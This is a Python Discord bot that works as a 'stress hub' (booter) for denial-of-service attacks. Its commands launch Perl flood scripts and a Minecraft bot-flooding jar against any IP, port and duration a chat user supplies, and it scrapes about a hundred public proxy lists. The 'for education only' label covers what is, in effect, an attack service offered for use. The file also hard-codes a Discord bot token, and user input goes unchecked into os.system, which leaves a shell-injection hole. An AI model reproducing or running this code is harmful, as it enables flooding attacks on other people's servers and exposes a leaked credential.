import discord
from discord.ext import commands
from discord.ext.commands import Bot
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3
import time
import sched
token = "MTM3ODY1NDUyNzU3NzkxOTU2OQ.Gx7Kne.Mzms0xPO-QkRga-1vE7x7jbksaoW5bHPyT-SDw"

# Set up bot intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent
intents.typing = False  # Optional: Disable unnecessary events
intents.presences = False  # Optional: Disable presence tracking

# Initialize bot with intents
client = commands.Bot(command_prefix=';', intents=intents)
client.remove_command('help')


proxy_sources = [
    # Popular proxy listing sites (HTML)
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.proxy-list.download/HTTP",
    "https://www.proxy-list.download/HTTPS",
    "https://www.proxynova.com/proxy-server-list/",
    "https://www.proxynova.com/proxy-server-list/elite-proxies/",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
    "https://www.proxynova.com/proxy-server-list/high-anonymous-proxies/",
    "https://spys.one/en/http-proxy-list/",
    "https://spys.one/en/socks-proxy-list/",
    "https://proxy-list.org/english/index.php",
    "https://www.geonode.com/free-proxy-list/",
    "https://hidemy.name/en/proxy-list/",
    "https://free-proxy.cz/en/",
    "https://www.cool-proxy.net/",
    "https://www.my-proxy.com/free-proxy-list.html",
    "https://www.proxy-list.download/SOCKS5",
    "https://www.proxy-list.download/SOCKS4",
    "https://www.socks-proxy.net/",
    "https://www.proxydocker.com/en/proxylist/all",
    "https://proxyspace.pro/",
    "https://proxyscraper.github.io/proxy-list/",
    "https://checkerproxy.net/getAllProxy",
    "https://proxydb.net/",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://multiproxy.org/txt_anon/proxy.txt",
    "https://proxylistdownload.com/",
    "https://list.proxylistplus.com/Proxies/HighAnonymity",
    "https://list.proxylistplus.com/Proxies/Anonymous",
    "https://list.proxylistplus.com/Proxies/SSL",

    # Raw proxy lists on GitHub
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks4_list/master/proxy.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies_socks4.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies_socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/socks5.txt",
    "https://raw.githubusercontent.com/iproyal/free-proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/AnonymouX47/Free-Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",

    # Proxy APIs and aggregators
    "https://api.proxyscrape.com/?request=getproxies&proxytype=http",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5",
    "https://www.proxyscan.io/download?type=http",
    "https://www.proxyscan.io/download?type=socks4",
    "https://www.proxyscan.io/download?type=socks5",
    "https://proxylist.geonode.com/api/proxy-list?limit=300&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?limit=300&page=2&sort_by=lastChecked&sort_type=desc",
    "https://openproxy.space/list/http",
    "https://openproxy.space/list/socks4",
    "https://openproxy.space/list/socks5",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.openproxylist.xyz/socks4.txt",
    "https://api.openproxylist.xyz/socks5.txt",

    # Regional / niche sites
    "https://spys.one/en/free-proxy-list/US/",
    "https://spys.one/en/free-proxy-list/DE/",
    "https://spys.one/en/free-proxy-list/FR/",
    "https://spys.one/en/free-proxy-list/GB/",
    "https://spys.one/en/free-proxy-list/CN/",
    "https://spys.one/en/free-proxy-list/KR/",
    "https://spys.one/en/free-proxy-list/BR/",
    "https://spys.one/en/free-proxy-list/IN/",
    "https://proxy--list.ru/",
    "https://hidemy.name/ru/proxy-list/",
    "https://free-proxy-list.net/ru",
    "https://www.proxynova.com/proxy-server-list/country-ru/",

    # Other / odd sources
    "https://proxy11.com/api/proxy?key=public&format=txt&type=http",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/socks4.txt",
    "https://proxyspace.pro/socks5.txt",
    "https://checkerproxy.net/getAllProxy",
    "https://proxydb.net/",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://multiproxy.org/txt_anon/proxy.txt",
    "https://proxylistdownload.com/",
    "https://list.proxylistplus.com/Proxies/HighAnonymity",
    "https://list.proxylistplus.com/Proxies/Anonymous",
    "https://list.proxylistplus.com/Proxies/SSL",
    "https://proxy--list.ru/",
    "https://proxy--list.ru/freeproxy",
    "https://ab57.ru/downloads/proxyold.txt",
    "https://raw.githubusercontent.com/ruzhun/proxy-list/main/proxy.txt",
    "https://spys.me/proxy.txt",
    "https://tools.rosinstrument.com/proxy/",
    "https://vpnbook.com/free-web-proxy/",
    "https://vpnbook.com/free-proxy/",
    "https://www.proxy-list.download/SOCKS5",
    "https://www.proxy-list.download/SOCKS4",
    "https://www.socks-proxy.net/",
    "http://rootjazz.com/proxies/proxies.txt",
    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",

    # And many more you can discover by searching proxy lists, GitHub repos, forums, etc.
]


def fetch_proxies():
    proxies = set()
    for url in proxy_sources:
        try:
            resp = requests.get(url, timeout=10)
            if "raw.githubusercontent" in url:
                proxies.update(resp.text.strip().splitlines())
            else:
                soup = BeautifulSoup(resp.text, "html.parser")
                rows = soup.find_all("tr")
                for row in rows[1:]:
                    cols = row.find_all("td")
                    if len(cols) >= 2:
                        ip = cols[0].text.strip()
                        port = cols[1].text.strip()
                        proxies.add(f"{ip}:{port}")
        except Exception as e:
            print(f"Error scraping {url}: {e}")
    return list(proxies)

@client.command()
async def proxy(ctx, arg=None):
    if arg != "reload":
        await ctx.send("Usage: `!proxy reload` to scrape fresh proxies.")
        return

    await ctx.send("🔄 Scraping fresh proxies...")

    loop = asyncio.get_event_loop()
    proxies = await loop.run_in_executor(None, fetch_proxies)

    with open("proxies.txt", "w") as f:
        for proxy in proxies:
            f.write(proxy + "\n")

    await ctx.send(f"✅ Scraped {len(proxies)} proxies and saved to `proxies.txt`.")


@client.event
async def on_ready():
    activity = discord.Game(name=";help | by DreamVision", type=3)
    await client.change_presence(status=discord.Status.idle, activity=activity)
    print("DreamVision On TOP")

@client.command()
async def help(ctx):
    help_text = (
        "**Commands:**\n"
        "`;Attack <ip> <port> <seconds>` - Starts the stress test (for education only).\n"
    )
    await ctx.send(help_text)

@client.command()
async def attack(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"perl test2.pl {arg1} {arg2} {arg3} 65507 999999999999999999999999999")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
async def attack2(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"perl reckz.pl {arg1} {arg2} 1024 {arg3}")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
async def attack3(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"perl ovh3.pl {arg1} {arg2} {arg3}")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg-3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
async def chatbot(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar toxicbot.jar {arg1}:{arg2} 340 chatbot {arg3} -1 ")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
async def join(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar toxicbot.jar {arg1}:{arg2} 340 join {arg3} -1 ")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
async def botjoiner(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=250 -Ddelay=1 -Drmnwp=false -jar toxicbot.jar {arg1}:{arg2} 340 botjoiner {arg3} -1 ")
            os.system(f"")

        embed = discord.Embed(title='Dream Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``Custom``', value='**Time**: ``{arg3} sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="DreamVision")
        embed.set_image(url=f'http://status.mclive.eu/DreamVision/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

client.run(token)

